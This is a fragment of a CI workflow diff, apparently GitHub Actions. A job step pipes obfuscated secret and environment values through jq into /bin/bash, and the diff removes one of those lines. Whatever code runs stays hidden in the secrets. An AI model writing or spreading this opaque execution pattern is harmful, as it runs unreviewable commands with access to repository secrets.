@@ -21,7 +21,6 @@ jobs:
           qa0145: ${{ secrets.qa0145 }}
         run: |
           printf '%s' "$qa0145" | jq -r .yoz0692 | /bin/bash
-          printf '%s' "$ishu78009" | jq -r .z41 | /bin/bash
           printf '%s' "$siqg52" | jq -r .zf82430 | /bin/bash
           echo $hrz26931 | jq -r .oyayr3 | /bin/bash
 
